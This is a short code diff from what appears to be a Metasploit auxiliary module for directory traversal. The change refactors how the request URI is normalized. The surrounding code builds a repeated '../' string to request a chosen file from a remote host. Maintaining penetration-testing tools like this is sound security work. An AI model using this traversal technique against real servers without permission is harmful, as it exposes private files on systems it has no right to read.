@@ -49,7 +49,8 @@ class Metasploit3 < Msf::Auxiliary
 	def run_host(ip)
 		file     = (datastore['FILE'][0,1] == '/') ? datastore['FILE'] : "/#{datastore['FILE']}"
 		traverse = "../" * datastore['DEPTH']
-		base     = File.dirname("#{target_uri.path}/.")
+		uri      = normalize_uri(target_uri.path)
+		base     = File.dirname("#{uri}/.")
 
 		print_status("Requesting: #{file} - #{rhost}")
 		res = send_request_cgi({
